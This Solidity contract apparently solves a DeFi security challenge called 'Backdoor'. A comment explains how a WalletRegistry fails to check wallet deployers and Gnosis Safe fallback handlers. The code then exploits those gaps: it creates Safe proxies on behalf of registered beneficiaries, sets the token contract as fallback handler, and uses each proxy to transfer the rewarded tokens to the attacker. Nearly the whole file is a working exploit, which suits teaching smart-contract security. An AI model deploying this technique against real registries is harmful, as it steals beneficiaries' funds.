// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./WalletRegistry.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

contract Backdoor {
    /**
    The vulnerability in Wallet Registry is that, even though it verifies stuff like Master copy address, wallet setup selector, etc:
    
    1. It doesn't verify that the Wallet deployer is one of the registered beneficiaries, which allows anyone to make wallets on behalf of a beneficiary and deny them their DVT.

    2. Each wallet has a fallback mechanism that the WalletRegistry does not even check, allowing attacker to setup a backdoor function that will be called by the deployed Safe proxy itself, on any target contract.

    Combining these vulnerabilities, the attack steps are:

    1. Call `createProxyWithCallback()` on Safe Factory, with:
        a) An `initializer` that it setups a registered beneficiary as owner and threshold to 1, setting DVT contract as fallback address (backdoor).
        b) A `callback` that it calls the Wallet Registry 

    2. By this stage, WalletRegistry has transferred 10 DVT to deployed proxy. Call "transfer()" on Wallet proxy. With our backdoor, this call will be sent to DVT contract (fallback address), effectively transferring all its DVT.

    Do the above for all registered beneficiaries.

     */

    function initiateAttack(
        WalletRegistry _walletRegistry,
        address[] calldata _registeredBeneficiaries
    ) external {
        //////////////////
        // ATTACK STEP: 1
        //////////////////

        // Get contract addresses needed
        GnosisSafe gnosisSafeMasterCopy = GnosisSafe(
            payable(_walletRegistry.masterCopy())
        );
        GnosisSafeProxyFactory proxyFactory = GnosisSafeProxyFactory(
            _walletRegistry.walletFactory()
        );
        IERC20 dvtContract = IERC20(_walletRegistry.token());

        // Deploy wallets for each registered beneficiary
        for (uint256 i = 0; i < _registeredBeneficiaries.length; i++) {
            // Prepare initializer (data used for call to setup wallet proxy)
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                _registeredBeneficiaries[i:i + 1],
                1,
                0,
                "",
                address(dvtContract),
                0,
                0,
                0
            );

            // Create wallet for benefeciary
            GnosisSafeProxy safeWalletProxy = proxyFactory
                .createProxyWithCallback(
                    address(gnosisSafeMasterCopy),
                    initializer,
                    0,
                    _walletRegistry
                );

            // Check if this Proxy received 10 DVT
            require(
                dvtContract.balanceOf(address(safeWalletProxy)) == 10 ether,
                "WALLET PROXY DID NOT RECEIVE 10 DVT"
            );

            //////////////////
            // ATTACK STEP: 2
            //////////////////
            (bool success, ) = address(safeWalletProxy).call(
                abi.encodeWithSignature(
                    "transfer(address,uint256)",
                    address(msg.sender),
                    10 ether
                )
            );
            require(success, "TRANSFER BACKDOOR CALL FAILED");
        }
    }
}
